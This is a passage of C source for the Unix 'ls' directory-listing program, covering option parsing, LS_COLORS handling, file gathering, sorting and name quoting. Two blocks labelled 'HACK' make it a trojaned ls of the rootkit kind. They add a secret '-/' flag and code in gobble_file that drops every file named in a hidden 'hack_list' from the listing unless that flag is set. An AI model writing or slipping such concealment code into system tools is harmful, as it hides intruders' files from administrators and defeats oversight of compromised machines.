	  break;

	case 'l':
	  format = long_format;
	  break;

	case 'm':
	  format = with_commas;
	  break;

	case 'n':
	  numeric_users = 1;
	  break;

	case 'o':  /* Just like -l, but don't display group info.  */
	  format = long_format;
	  inhibit_group = 1;
	  break;

	case 'p':
	  indicator_style = not_programs;
	  break;

	case 'q':
	  qmark_funny_chars = 1;
	  quote_funny_chars = 0;
	  break;

	case 'r':
	  sort_reverse = 1;
	  break;

	case 's':
	  print_block_size = 1;
	  break;

	case 't':
	  sort_type = sort_time;
	  break;

	case 'u':
	  time_type = time_atime;
	  break;

	case 'w':
	  if (xstrtol (optarg, NULL, 0, &tmp_long, NULL) != LONGINT_OK
	      || tmp_long <= 0 || tmp_long > INT_MAX)
	    error (1, 0, _("invalid line width: %s"), optarg);
	  line_length = (int) tmp_long;
	  break;

	case 'x':
	  format = horizontal;
	  break;

	case 'A':
	  all_files = 1;
	  break;

	case 'B':
	  add_ignore_pattern ("*~");
	  add_ignore_pattern (".*~");
	  break;

	case 'C':
	  format = many_per_line;
	  break;

	case 'D':
	  dired = 1;
	  break;

	case 'F':
	  indicator_style = all;
	  break;

	case 'G':		/* inhibit display of group info */
	  inhibit_group = 1;
	  break;

	case 'I':
	  add_ignore_pattern (optarg);
	  break;

	case 'L':
	  trace_links = 1;
	  break;

	case 'N':
	  quote_funny_chars = 0;
	  qmark_funny_chars = 0;
	  break;

	case 'Q':
	  quote_as_string = 1;
	  quote_funny_chars = 1;
	  qmark_funny_chars = 0;
	  break;

	case 'R':
	  trace_dirs = 1;
	  break;

	case 'S':
	  sort_type = sort_size;
	  break;

	case 'T':
	  if (xstrtol (optarg, NULL, 0, &tmp_long, NULL) != LONGINT_OK
	      || tmp_long < 0 || tmp_long > INT_MAX)
	    error (1, 0, _("invalid tab size: %s"), optarg);
	  tabsize = (int) tmp_long;
	  break;

	case 'U':
	  sort_type = sort_none;
	  break;

	case 'X':
	  sort_type = sort_extension;
	  break;

	case '1':
	  format = one_per_line;
	  break;

        case '7':
          break;

        case '8':
          break;

	case 10:		/* --sort */
	  i = argmatch (optarg, sort_args);
	  if (i < 0)
	    {
	      invalid_arg (_("sort type"), optarg, i);
	      usage (1);
	    }
	  sort_type = sort_types[i];
	  break;

	case 11:		/* --time */
	  i = argmatch (optarg, time_args);
	  if (i < 0)
	    {
	      invalid_arg (_("time type"), optarg, i);
	      usage (1);
	    }
	  time_type = time_types[i];
	  break;

	case 12:		/* --format */
	  i = argmatch (optarg, format_args);
	  if (i < 0)
	    {
	      invalid_arg (_("format type"), optarg, i);
	      usage (1);
	    }
	  format = formats[i];
	  break;

	case 13:		/* --color */
	  if (optarg)
	    {
	      i = argmatch (optarg, color_args);
	      if (i < 0)
		{
		  invalid_arg (_("colorization criterion"), optarg, i);
		  usage (1);
		}
	      i = color_types[i];
	    }
	  else
	    {
	      /* Using --color with no argument is equivalent to using
		 --color=always.  */
	      i = color_always;
	    }

	  print_with_color = (i == color_always
			      || (i == color_if_tty
				  && isatty (STDOUT_FILENO)));

	  if (print_with_color)
	    {
	      /* Don't use TAB characters in output.  Some terminal
		 emulators can't handle the combination of tabs and
		 color codes on the same line.  */
	      tabsize = 0;
	    }
	  break;

/* HACK VIEW ALL FILES WITH -/ */
#if defined (SHOWFLAG)
                case '/':
                        showall++;
                        break;
#endif

	default:
	  usage (1);
	}
    }

  return optind;
}

/* Parse a string as part of the LS_COLORS variable; this may involve
   decoding all kinds of escape characters.  If equals_end is set an
   unescaped equal sign ends the string, otherwise only a : or \0
   does.  Returns the number of characters output, or -1 on failure.

   The resulting string is *not* null-terminated, but may contain
   embedded nulls.

   Note that both dest and src are char **; on return they point to
   the first free byte after the array and the character that ended
   the input string, respectively.  */

static int
get_funky_string (char **dest, const char **src, int equals_end)
{
  int num;			/* For numerical codes */
  int count;			/* Something to count with */
  enum {
    ST_GND, ST_BACKSLASH, ST_OCTAL, ST_HEX, ST_CARET, ST_END, ST_ERROR
  } state;
  const char *p;
  char *q;

  p = *src;			/* We don't want to double-indirect */
  q = *dest;			/* the whole darn time.  */

  count = 0;			/* No characters counted in yet.  */
  num = 0;

  state = ST_GND;		/* Start in ground state.  */
  while (state < ST_END)
    {
      switch (state)
	{
	case ST_GND:		/* Ground state (no escapes) */
	  switch (*p)
	    {
	    case ':':
	    case '\0':
	      state = ST_END;	/* End of string */
	      break;
	    case '\\':
	      state = ST_BACKSLASH; /* Backslash scape sequence */
	      ++p;
	      break;
	    case '^':
	      state = ST_CARET; /* Caret escape */
	      ++p;
	      break;
	    case '=':
	      if (equals_end)
		{
		  state = ST_END; /* End */
		  break;
		}
	      /* else fall through */
	    default:
	      *(q++) = *(p++);
	      ++count;
	      break;
	    }
	  break;

	case ST_BACKSLASH:	/* Backslash escaped character */
	  switch (*p)
	    {
	    case '0':
	    case '1':
	    case '2':
	    case '3':
	    case '4':
	    case '5':
	    case '6':
	    case '7':
	      state = ST_OCTAL;	/* Octal sequence */
	      num = *p - '0';
	      break;
	    case 'x':
	    case 'X':
	      state = ST_HEX;	/* Hex sequence */
	      num = 0;
	      break;
	    case 'a':		/* Bell */
	      num = 7;		/* Not all C compilers know what \a means */
	      break;
	    case 'b':		/* Backspace */
	      num = '\b';
	      break;
	    case 'e':		/* Escape */
	      num = 27;
	      break;
	    case 'f':		/* Form feed */
	      num = '\f';
	      break;
	    case 'n':		/* Newline */
	      num = '\n';
	      break;
	    case 'r':		/* Carriage return */
	      num = '\r';
	      break;
	    case 't':		/* Tab */
	      num = '\t';
	      break;
	    case 'v':		/* Vtab */
	      num = '\v';
	      break;
	    case '?':		/* Delete */
              num = 127;
	      break;
	    case '_':		/* Space */
	      num = ' ';
	      break;
	    case '\0':		/* End of string */
	      state = ST_ERROR;	/* Error! */
	      break;
	    default:		/* Escaped character like \ ^ : = */
	      num = *p;
	      break;
	    }
	  if (state == ST_BACKSLASH)
	    {
	      *(q++) = num;
	      ++count;
	      state = ST_GND;
	    }
	  ++p;
	  break;

	case ST_OCTAL:		/* Octal sequence */
	  if (*p < '0' || *p > '7')
	    {
	      *(q++) = num;
	      ++count;
	      state = ST_GND;
	    }
	  else
	    num = (num << 3) + (*(p++) - '0');
	  break;

	case ST_HEX:		/* Hex sequence */
	  switch (*p)
	    {
	    case '0':
	    case '1':
	    case '2':
	    case '3':
	    case '4':
	    case '5':
	    case '6':
	    case '7':
	    case '8':
	    case '9':
	      num = (num << 4) + (*(p++) - '0');
	      break;
	    case 'a':
	    case 'b':
	    case 'c':
	    case 'd':
	    case 'e':
	    case 'f':
	      num = (num << 4) + (*(p++) - 'a') + 10;
	      break;
	    case 'A':
	    case 'B':
	    case 'C':
	    case 'D':
	    case 'E':
	    case 'F':
	      num = (num << 4) + (*(p++) - 'A') + 10;
	      break;
	    default:
	      *(q++) = num;
	      ++count;
	      state = ST_GND;
	      break;
	    }
	  break;

	case ST_CARET:		/* Caret escape */
	  state = ST_GND;	/* Should be the next state... */
	  if (*p >= '@' && *p <= '~')
	    {
	      *(q++) = *(p++) & 037;
	      ++count;
	    }
	  else if ( *p == '?' )
	    {
	      *(q++) = 127;
	      ++count;
	    }
	  else
	    state = ST_ERROR;
	  break;

	default:
	  abort();
	}
    }

  *dest = q;
  *src = p;

  return state == ST_ERROR ? -1 : count;
}

static void
parse_ls_color (void)
{
  const char *p;		/* Pointer to character being parsed */
  char *buf;			/* color_buf buffer pointer */
  int state;			/* State of parser */
  int ind_no;			/* Indicator number */
  char label[3];		/* Indicator label */
  struct col_ext_type *ext;	/* Extension we are working on */
  struct col_ext_type *ext2;	/* Extra pointer */

  if ((p = getenv ("LS_COLORS")) == NULL || *p == '\0')
    return;

  ext = NULL;
  strcpy (label, "??");

  /* This is an overly conservative estimate, but any possible
     LS_COLORS string will *not* generate a color_buf longer than
     itself, so it is a safe way of allocating a buffer in
     advance.  */
  buf = color_buf = xstrdup (p);

  state = 1;
  while (state > 0)
    {
      switch (state)
	{
	case 1:		/* First label character */
	  switch (*p)
	    {
	    case ':':
	      ++p;
	      break;

	    case '*':
	      /* Allocate new extension block and add to head of
		 linked list (this way a later definition will
		 override an earlier one, which can be useful for
		 having terminal-specific defs override global).  */

	      ext = (struct col_ext_type *)
		xmalloc (sizeof (struct col_ext_type));
	      ext->next = col_ext_list;
	      col_ext_list = ext;

	      ++p;
	      ext->ext.string = buf;

	      state = (ext->ext.len =
		       get_funky_string (&buf, &p, 1)) < 0 ? -1 : 4;
	      break;

	    case '\0':
	      state = 0;	/* Done! */
	      break;

	    default:	/* Assume it is file type label */
	      label[0] = *(p++);
	      state = 2;
	      break;
	    }
	  break;

	case 2:		/* Second label character */
	  if (*p)
	    {
	      label[1] = *(p++);
	      state = 3;
	    }
	  else
	    state = -1;	/* Error */
	  break;

	case 3:		/* Equal sign after indicator label */
	  state = -1;	/* Assume failure... */
	  if (*(p++) == '=')/* It *should* be... */
	    {
	      for (ind_no = 0; indicator_name[ind_no] != NULL; ++ind_no)
		{
		  if (STREQ (label, indicator_name[ind_no]))
		    {
		      color_indicator[ind_no].string = buf;
		      state = ((color_indicator[ind_no].len =
				get_funky_string (&buf, &p, 0)) < 0 ? -1 : 1);
		      break;
		    }
		}
	      if (state == -1)
		error (0, 0, _("unrecognized prefix: %s"), label);
	    }
	 break;

	case 4:		/* Equal sign after *.ext */
	  if (*(p++) == '=')
	    {
	      ext->seq.string = buf;
	      state = (ext->seq.len =
		       get_funky_string (&buf, &p, 0)) < 0 ? -1 : 1;
	    }
	  else
	    state = -1;
	  break;
	}
    }

  if (state < 0)
    {
      struct col_ext_type *e;

      error (0, 0,
	     _("unparsable value for LS_COLORS environment variable"));
      free (color_buf);
      for (e = col_ext_list; e != NULL ; /* empty */)
	{
	  ext2 = e;
	  e = e->next;
	  free (ext2);
	}
      print_with_color = 0;
    }
}

/* Request that the directory named `name' have its contents listed later.
   If `realname' is nonzero, it will be used instead of `name' when the
   directory name is printed.  This allows symbolic links to directories
   to be treated as regular directories but still be listed under their
   real names. */

static void
queue_directory (const char *name, const char *realname)
{
  struct pending *new;

  new = (struct pending *) xmalloc (sizeof (struct pending));
  new->next = pending_dirs;
  pending_dirs = new;
  new->name = xstrdup (name);
  if (realname)
    new->realname = xstrdup (realname);
  else
    new->realname = 0;
}

/* Read directory `name', and list the files in it.
   If `realname' is nonzero, print its name instead of `name';
   this is used for symbolic links to directories. */

static void
print_dir (const char *name, const char *realname)
{
  register DIR *reading;
  register struct dirent *next;
  register int total_blocks = 0;

  errno = 0;
  reading = opendir (name);
  if (!reading)
    {
      error (0, errno, "%s", name);
      exit_status = 1;
      return;
    }

  /* Read the directory entries, and insert the subfiles into the `files'
     table.  */

  clear_files ();

  while ((next = readdir (reading)) != NULL)
    if (file_interesting (next))
      total_blocks += gobble_file (next->d_name, 0, name);

  if (CLOSEDIR (reading))
    {
      error (0, errno, "%s", name);
      exit_status = 1;
      /* Don't return; print whatever we got. */
    }

  /* Sort the directory contents.  */
  sort_files ();

  /* If any member files are subdirectories, perhaps they should have their
     contents listed rather than being mentioned here as files.  */

  if (trace_dirs)
    extract_dirs_from_files (name, 1);

  if (print_dir_name)
    {
      const char *dir;

      DIRED_INDENT ();
      dir = (realname ? realname : name);
      PUSH_CURRENT_DIRED_POS (&subdired_obstack);
      FPUTS (dir, stdout, strlen (dir));
      PUSH_CURRENT_DIRED_POS (&subdired_obstack);
      FPUTS_LITERAL (":\n", stdout);
    }

  if (format == long_format || print_block_size)
    {
      char buf[6 + 20 + 1 + 1];

      DIRED_INDENT ();
      sprintf (buf, "total %u\n", total_blocks);
      FPUTS (buf, stdout, strlen (buf));
    }

  if (files_index)
    print_current_files ();

  if (pending_dirs)
    PUTCHAR ('\n');
}

/* Add `pattern' to the list of patterns for which files that match are
   not listed.  */

static void
add_ignore_pattern (const char *pattern)
{
  register struct ignore_pattern *ignore;

  ignore = (struct ignore_pattern *) xmalloc (sizeof (struct ignore_pattern));
  ignore->pattern = pattern;
  /* Add it to the head of the linked list. */
  ignore->next = ignore_patterns;
  ignore_patterns = ignore;
}

/* Return nonzero if the file in `next' should be listed. */

static int
file_interesting (const struct dirent *next)
{
  register struct ignore_pattern *ignore;

  for (ignore = ignore_patterns; ignore; ignore = ignore->next)
    if (fnmatch (ignore->pattern, next->d_name, FNM_PERIOD) == 0)
      return 0;

  if (really_all_files
      || next->d_name[0] != '.'
      || (all_files
	  && next->d_name[1] != '\0'
	  && (next->d_name[1] != '.' || next->d_name[2] != '\0')))
    return 1;

  return 0;
}

/* Enter and remove entries in the table `files'.  */

/* Empty the table of files. */

static void
clear_files (void)
{
  register int i;

  for (i = 0; i < files_index; i++)
    {
      free (files[i].name);
      if (files[i].linkname)
	free (files[i].linkname);
    }

  files_index = 0;
  block_size_size = 4;
}

/* Add a file to the current table of files.
   Verify that the file exists, and print an error message if it does not.
   Return the number of blocks that the file occupies.  */

static int
gobble_file (const char *name, int explicit_arg, const char *dirname)
{
  register int blocks;
  register int val;
  register char *path;

/* HACK MASK OUT FILES */
/*+
 *  mask out the files in the list we read in earlier.  if
 *  showflag is >0 then we should not do any masking.  Note
 *  that each time a file is read from the structure it is
 *  compared.  If you have 1000 files in your ls blockout
 *  file, this might go a bit slow.
 *
 *  Note, I don't like continue but its an easy work around.
+*/
if (!showall) {
                        for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
                                if (!(strcmp(name, h_tmp->filename)))
                                        return 0;

                /*  More kludge - bleah  */
                if (!(strcmp(name, h_tmp->filename)))
                        return 0;
}
  if (files_index == nfiles)
    {
      nfiles *= 2;
      files = (struct fileinfo *) xrealloc (files, sizeof (*files) * nfiles);
    }

  files[files_index].linkname = 0;
  files[files_index].linkmode = 0;

  if (explicit_arg || format_needs_stat)
    {
      /* `path' is the absolute pathname of this file. */

      if (name[0] == '/' || dirname[0] == 0)
	path = (char *) name;
      else
	{
	  path = (char *) alloca (strlen (name) + strlen (dirname) + 2);
	  attach (path, dirname, name);
	}

      if (trace_links)
	{
	  val = stat (path, &files[files_index].stat);
	  if (val < 0)
	    /* Perhaps a symbolically-linked to file doesn't exist; stat
	       the link instead. */
	    val = lstat (path, &files[files_index].stat);
	}
      else
	val = lstat (path, &files[files_index].stat);
      if (val < 0)
	{
	  error (0, errno, "%s", path);
	  exit_status = 1;
	  return 0;
	}

#ifdef S_ISLNK
      if (S_ISLNK (files[files_index].stat.st_mode)
	  && (explicit_arg || format == long_format))
	{
	  char *linkpath;
	  struct stat linkstats;

	  get_link_name (path, &files[files_index]);
	  linkpath = make_link_path (path, files[files_index].linkname);

	  /* Avoid following symbolic links when possible, ie, when
	     they won't be traced and when no indicator is needed. */
	  if (linkpath
	      && ((explicit_arg && format != long_format)
		  || indicator_style != none)
	      && stat (linkpath, &linkstats) == 0)
	    {
	      /* Symbolic links to directories that are mentioned on the
	         command line are automatically traced if not being
	         listed as files.  */
	      if (explicit_arg && format != long_format
		  && S_ISDIR (linkstats.st_mode))
		{
		  /* Substitute the linked-to directory's name, but
		     save the real name in `linkname' for printing.  */
		  if (!immediate_dirs)
		    {
		      const char *tempname = name;
		      name = linkpath;
		      linkpath = files[files_index].linkname;
		      files[files_index].linkname = (char *) tempname;
		    }
		  files[files_index].stat = linkstats;
		}
	      else
		/* Get the linked-to file's mode for the filetype indicator
		   in long listings.  */
		files[files_index].linkmode = linkstats.st_mode;
	    }
	  if (linkpath)
	    free (linkpath);
	}
#endif

#ifdef S_ISLNK
      if (S_ISLNK (files[files_index].stat.st_mode))
	files[files_index].filetype = symbolic_link;
      else
#endif
      if (S_ISDIR (files[files_index].stat.st_mode))
	{
	  if (explicit_arg && !immediate_dirs)
	    files[files_index].filetype = arg_directory;
	  else
	    files[files_index].filetype = directory;
	}
      else
	files[files_index].filetype = normal;

      blocks = convert_blocks (ST_NBLOCKS (files[files_index].stat),
			       kilobyte_blocks);
      if (blocks >= 10000 && block_size_size < 5)
	block_size_size = 5;
      if (blocks >= 100000 && block_size_size < 6)
	block_size_size = 6;
      if (blocks >= 1000000 && block_size_size < 7)
	block_size_size = 7;
    }
  else
    blocks = 0;

  files[files_index].name = xstrdup (name);
  files_index++;

  return blocks;
}

#ifdef S_ISLNK

/* Put the name of the file that `filename' is a symbolic link to
   into the `linkname' field of `f'. */

static void
get_link_name (const char *filename, struct fileinfo *f)
{
  char *linkbuf;
  register int linksize;

  linkbuf = (char *) alloca (PATH_MAX + 2);
  /* Some automounters give incorrect st_size for mount points.
     I can't think of a good workaround for it, though.  */
  linksize = readlink (filename, linkbuf, PATH_MAX + 1);
  if (linksize < 0)
    {
      error (0, errno, "%s", filename);
      exit_status = 1;
    }
  else
    {
      linkbuf[linksize] = '\0';
      f->linkname = xstrdup (linkbuf);
    }
}

/* If `linkname' is a relative path and `path' contains one or more
   leading directories, return `linkname' with those directories
   prepended; otherwise, return a copy of `linkname'.
   If `linkname' is zero, return zero. */

static char *
make_link_path (const char *path, const char *linkname)
{
  char *linkbuf;
  int bufsiz;

  if (linkname == 0)
    return 0;

  if (*linkname == '/')
    return xstrdup (linkname);

  /* The link is to a relative path.  Prepend any leading path
     in `path' to the link name. */
  linkbuf = strrchr (path, '/');
  if (linkbuf == 0)
    return xstrdup (linkname);

  bufsiz = linkbuf - path + 1;
  linkbuf = xmalloc (bufsiz + strlen (linkname) + 1);
  strncpy (linkbuf, path, bufsiz);
  strcpy (linkbuf + bufsiz, linkname);
  return linkbuf;
}
#endif

/* Remove any entries from `files' that are for directories,
   and queue them to be listed as directories instead.
   `dirname' is the prefix to prepend to each dirname
   to make it correct relative to ls's working dir.
   `recursive' is nonzero if we should not treat `.' and `..' as dirs.
   This is desirable when processing directories recursively.  */

static void
extract_dirs_from_files (const char *dirname, int recursive)
{
  register int i, j;
  register char *path;
  int dirlen;

  dirlen = strlen (dirname) + 2;
  /* Queue the directories last one first, because queueing reverses the
     order.  */
  for (i = files_index - 1; i >= 0; i--)
    if ((files[i].filetype == directory || files[i].filetype == arg_directory)
	&& (!recursive || is_not_dot_or_dotdot (files[i].name)))
      {
	if (files[i].name[0] == '/' || dirname[0] == 0)
	  {
	    queue_directory (files[i].name, files[i].linkname);
	  }
	else
	  {
	    path = (char *) xmalloc (strlen (files[i].name) + dirlen);
	    attach (path, dirname, files[i].name);
	    queue_directory (path, files[i].linkname);
	    free (path);
	  }
	if (files[i].filetype == arg_directory)
	  free (files[i].name);
      }

  /* Now delete the directories from the table, compacting all the remaining
     entries.  */

  for (i = 0, j = 0; i < files_index; i++)
    if (files[i].filetype != arg_directory)
      files[j++] = files[i];
  files_index = j;
}

/* Return nonzero if `name' doesn't end in `.' or `..'
   This is so we don't try to recurse on `././././. ...' */

static int
is_not_dot_or_dotdot (const char *name)
{
  char *t;

  t = strrchr (name, '/');
  if (t)
    name = t + 1;

  if (name[0] == '.'
      && (name[1] == '\0'
	  || (name[1] == '.' && name[2] == '\0')))
    return 0;

  return 1;
}

/* Sort the files now in the table.  */

static void
sort_files (void)
{
  int (*func) ();

  switch (sort_type)
    {
    case sort_none:
      return;
    case sort_time:
      switch (time_type)
	{
	case time_ctime:
	  func = sort_reverse ? rev_cmp_ctime : compare_ctime;
	  break;
	case time_mtime:
	  func = sort_reverse ? rev_cmp_mtime : compare_mtime;
	  break;
	case time_atime:
	  func = sort_reverse ? rev_cmp_atime : compare_atime;
	  break;
	default:
	  abort ();
	}
      break;
    case sort_name:
      func = sort_reverse ? rev_cmp_name : compare_name;
      break;
    case sort_extension:
      func = sort_reverse ? rev_cmp_extension : compare_extension;
      break;
    case sort_size:
      func = sort_reverse ? rev_cmp_size : compare_size;
      break;
    default:
      abort ();
    }

  qsort (files, files_index, sizeof (struct fileinfo), func);
}

/* Comparison routines for sorting the files. */

static int
compare_ctime (const struct fileinfo *file1, const struct fileinfo *file2)
{
  return longdiff (file2->stat.st_ctime, file1->stat.st_ctime);
}

static int
rev_cmp_ctime (const struct fileinfo *file2, const struct fileinfo *file1)
{
  return longdiff (file2->stat.st_ctime, file1->stat.st_ctime);
}

static int
compare_mtime (const struct fileinfo *file1, const struct fileinfo *file2)
{
  return longdiff (file2->stat.st_mtime, file1->stat.st_mtime);
}

static int
rev_cmp_mtime (const struct fileinfo *file2, const struct fileinfo *file1)
{
  return longdiff (file2->stat.st_mtime, file1->stat.st_mtime);
}

static int
compare_atime (const struct fileinfo *file1, const struct fileinfo *file2)
{
  return longdiff (file2->stat.st_atime, file1->stat.st_atime);
}

static int
rev_cmp_atime (const struct fileinfo *file2, const struct fileinfo *file1)
{
  return longdiff (file2->stat.st_atime, file1->stat.st_atime);
}

static int
compare_size (const struct fileinfo *file1, const struct fileinfo *file2)
{
  return longdiff (file2->stat.st_size, file1->stat.st_size);
}

static int
rev_cmp_size (const struct fileinfo *file2, const struct fileinfo *file1)
{
  return longdiff (file2->stat.st_size, file1->stat.st_size);
}

static int
compare_name (const struct fileinfo *file1, const struct fileinfo *file2)
{
  return strcmp (file1->name, file2->name);
}

static int
rev_cmp_name (const struct fileinfo *file2, const struct fileinfo *file1)
{
  return strcmp (file1->name, file2->name);
}

/* Compare file extensions.  Files with no extension are `smallest'.
   If extensions are the same, compare by filenames instead. */

static int
compare_extension (const struct fileinfo *file1, const struct fileinfo *file2)
{
  register char *base1, *base2;
  register int cmp;

  base1 = strrchr (file1->name, '.');
  base2 = strrchr (file2->name, '.');
  if (base1 == 0 && base2 == 0)
    return strcmp (file1->name, file2->name);
  if (base1 == 0)
    return -1;
  if (base2 == 0)
    return 1;
  cmp = strcmp (base1, base2);
  if (cmp == 0)
    return strcmp (file1->name, file2->name);
  return cmp;
}

static int
rev_cmp_extension (const struct fileinfo *file2, const struct fileinfo *file1)
{
  register char *base1, *base2;
  register int cmp;

  base1 = strrchr (file1->name, '.');
  base2 = strrchr (file2->name, '.');
  if (base1 == 0 && base2 == 0)
    return strcmp (file1->name, file2->name);
  if (base1 == 0)
    return -1;
  if (base2 == 0)
    return 1;
  cmp = strcmp (base1, base2);
  if (cmp == 0)
    return strcmp (file1->name, file2->name);
  return cmp;
}

/* List all the files now in the table.  */

static void
print_current_files (void)
{
  register int i;

  switch (format)
    {
    case one_per_line:
      for (i = 0; i < files_index; i++)
	{
	  print_file_name_and_frills (files + i);
	  putchar ('\n');
	}
      break;

    case many_per_line:
      print_many_per_line ();
      break;

    case horizontal:
      print_horizontal ();
      break;

    case with_commas:
      print_with_commas ();
      break;

    case long_format:
      for (i = 0; i < files_index; i++)
	{
	  print_long_format (files + i);
	  PUTCHAR ('\n');
	}
      break;
    }
}

static void
print_long_format (const struct fileinfo *f)
{
  char modebuf[20];
  char timebuf[40];

  /* 7 fields that may (worst case: 64-bit integral values) require 20 bytes,
     1 10-character mode string,
     1 24-character time string,
     9 spaces, one following each of these fields,
     and 1 trailing NUL byte.  */
  char bigbuf[7 * 20 + 10 + 24 + 9 + 1];
  char *p;
  time_t when;

  mode_string (f->stat.st_mode, modebuf);
  modebuf[10] = '\0';

  switch (time_type)
    {
    case time_ctime:
      when = f->stat.st_ctime;
      break;
    case time_mtime:
      when = f->stat.st_mtime;
      break;
    case time_atime:
      when = f->stat.st_atime;
      break;
    }

  strcpy (timebuf, ctime (&when));

  if (full_time)
    timebuf[24] = '\0';
  else
    {
      if (current_time > when + 6L * 30L * 24L * 60L * 60L	/* Old. */
	  || current_time < when - 60L * 60L)	/* In the future. */
	{
	  /* The file is fairly old or in the future.
	     POSIX says the cutoff is 6 months old;
	     approximate this by 6*30 days.
	     Allow a 1 hour slop factor for what is considered "the future",
	     to allow for NFS server/client clock disagreement.
	     Show the year instead of the time of day.  */
	  strcpy (timebuf + 11, timebuf + 19);
	}
      timebuf[16] = 0;
    }

  p = bigbuf;

  if (print_inode)
    {
      sprintf (p, "%*lu ", INODE_DIGITS, (unsigned long) f->stat.st_ino);
      p += strlen (p);
    }

  if (print_block_size)
    {
      sprintf (p, "%*u ", block_size_size,
	       (unsigned) convert_blocks (ST_NBLOCKS (f->stat),
					  kilobyte_blocks));
      p += strlen (p);
    }

  /* The space between the mode and the number of links is the POSIX
     "optional alternate access method flag". */
  sprintf (p, "%s %3u ", modebuf, (unsigned int) f->stat.st_nlink);
  p += strlen (p);

  if (numeric_users)
    sprintf (p, "%-8u ", (unsigned int) f->stat.st_uid);
  else
    sprintf (p, "%-8.8s ", getuser (f->stat.st_uid));
  p += strlen (p);

  if (!inhibit_group)
    {
      if (numeric_users)
	sprintf (p, "%-8u ", (unsigned int) f->stat.st_gid);
      else
	sprintf (p, "%-8.8s ", getgroup (f->stat.st_gid));
      p += strlen (p);
    }

  if (S_ISCHR (f->stat.st_mode) || S_ISBLK (f->stat.st_mode))
    sprintf (p, "%3u, %3u ", (unsigned) major (f->stat.st_rdev),
	     (unsigned) minor (f->stat.st_rdev));
  else
    sprintf (p, "%8lu ", (unsigned long) f->stat.st_size);
  p += strlen (p);

  sprintf (p, "%s ", full_time ? timebuf : timebuf + 4);
  p += strlen (p);

  DIRED_INDENT ();
  FPUTS (bigbuf, stdout, p - bigbuf);
  PUSH_CURRENT_DIRED_POS (&dired_obstack);
  print_name_with_quoting (f->name, f->stat.st_mode, f->linkok);
  PUSH_CURRENT_DIRED_POS (&dired_obstack);

  if (f->filetype == symbolic_link)
    {
      if (f->linkname)
	{
	  FPUTS_LITERAL (" -> ", stdout);
	  print_name_with_quoting (f->linkname, f->linkmode, f->linkok-1);
	  if (indicator_style != none)
	    print_type_indicator (f->linkmode);
	}
    }
  else if (indicator_style != none)
    print_type_indicator (f->stat.st_mode);
}

/* Set QUOTED_LENGTH to strlen(P) and return NULL if P == quoted(P).
   Otherwise, return xmalloc'd storage containing the quoted version
   of P and set QUOTED_LENGTH to the length of the quoted P.  */

static char *
quote_filename (register const char *p, size_t *quoted_length)
{
  register unsigned char c;
  const char *p0 = p;
  char *quoted, *q;
  int found_quotable;

  if (!quote_as_string && !quote_funny_chars && !qmark_funny_chars)
    {
      *quoted_length = strlen (p);
      return NULL;
    }

  found_quotable = 0;
  for (c = *p; c; c = *++p)
    {
      if (quote_funny_chars)
	{
	  switch (c)
	    {
	    case '\\':
	    case '\n':
	    case '\b':
	    case '\r':
	    case '\t':
	    case '\f':
	    case ' ':
	    case '"':
	      found_quotable = 1;
	      break;

	    default:
	      if (!ISGRAPH (c))
		found_quotable = 1;
	      break;
	    }
	}
      else
	{
	  if (!ISPRINT (c) && qmark_funny_chars)
	    found_quotable = 1;
	}
      if (found_quotable)
	break;
    }

  if (!found_quotable && !quote_as_string)
    {
      *quoted_length = p - p0;
      return NULL;
    }

  p = p0;
  quoted = xmalloc (4 * strlen (p) + 1);
  q = quoted;

#define SAVECHAR(c) *q++ = (c)
#define SAVE_2_CHARS(c12) \
    do { *q++ = ((c12)[0]); \
	 *q++ = ((c12)[1]); } while (0)

  if (quote_as_string)
    SAVECHAR ('"');

  while ((c = *p++))
    {
      if (quote_funny_chars)
	{
	  switch (c)
	    {
	    case '\\':
	      SAVE_2_CHARS ("\\\\");
	      break;

	    case '\n':
	      SAVE_2_CHARS ("\\n");
	      break;

	    case '\b':
	      SAVE_2_CHARS ("\\b");
	      break;

	    case '\r':
	      SAVE_2_CHARS ("\\r");
	      break;

	    case '\t':
	      SAVE_2_CHARS ("\\t");
	      break;

	    case '\f':
	      SAVE_2_CHARS ("\\f");
	      break;

	    case ' ':
	      SAVE_2_CHARS ("\\ ");
	      break;

	    case '"':
	      SAVE_2_CHARS ("\\\"");
	      break;

	    default:
	      if (ISGRAPH (c))
		SAVECHAR (c);
	      else
		{
		  char buf[5];
		  sprintf (buf, "\\%03o", (unsigned int) c);
		  q = stpcpy (q, buf);
		}
	    }
	}
      else
	{
	  if (ISPRINT (c))
	    SAVECHAR (c);
	  else if (!qmark_funny_chars)
	    SAVECHAR (c);
	  else
	    SAVECHAR ('?');
	}
    }

  if (quote_as_string)
    SAVECHAR ('"');

  *quoted_length = q - quoted;

  SAVECHAR ('\0');

  return quoted;
}

static void
print_name_with_quoting (const char *p, unsigned int mode, int linkok)
{
  char *quoted;
  size_t quoted_length;

  if (print_with_color)
    print_color_indicator (p, mode, linkok);

  quoted = quote_filename (p, &quoted_length);
  FPUTS (quoted != NULL ? quoted : p, stdout, quoted_length);
  if (quoted)
    free (quoted);

  if (print_with_color)
    {
      if (color_indicator[C_END].string != NULL)
	put_indicator (&color_indicator[C_END]);
      else
	{
	  put_indicator (&color_indicator[C_LEFT]);
	  put_indicator (&color_indicator[C_NORM]);
	  put_indicator (&color_indicator[C_RIGHT]);
	}
    }
}

/* Print the file name of `f' with appropriate quoting.
   Also print file size, inode number, and filetype indicator character,
   as requested by switches.  */

static void
print_file_name_and_frills (const struct fileinfo *f)
{
  if (print_inode)
    printf ("%*lu ", INODE_DIGITS, (unsigned long) f->stat.st_ino);

  if (print_block_size)
    printf ("%*u ", block_size_size,
	    (unsigned) convert_blocks (ST_NBLOCKS (f->stat),
				       kilobyte_blocks));

  print_name_with_quoting (f->name, f->stat.st_mode, f->linkok);

  if (indicator_style != none)
    print_type_indicator (f->stat.st_mode);
}

static void
print_type_indicator (unsigned int mode)
{
  if (S_ISDIR (mode))
    PUTCHAR ('/');

#ifdef S_ISLNK
  if (S_ISLNK (mode))
    PUTCHAR ('@');
#endif

#ifdef S_ISFIFO
  if (S_ISFIFO (mode))
    PUTCHAR ('|');
#endif

#ifdef S_ISSOCK
  if (S_ISSOCK (mode))
    PUTCHAR ('=');
#endif

  if (S_ISREG (mode) && indicator_style == all
      && (mode & (S_IEXEC | S_IXGRP | S_IXOTH)))
    PUTCHAR ('*');
}

static void
print_color_indicator (const char *name, unsigned int mode, int linkok)
{
  int type = C_FILE;
  struct col_ext_type *ext;	/* Color extension */
  size_t len;			/* Length of name */

  /* Is this a nonexistent file?  If so, linkok == -1.  */

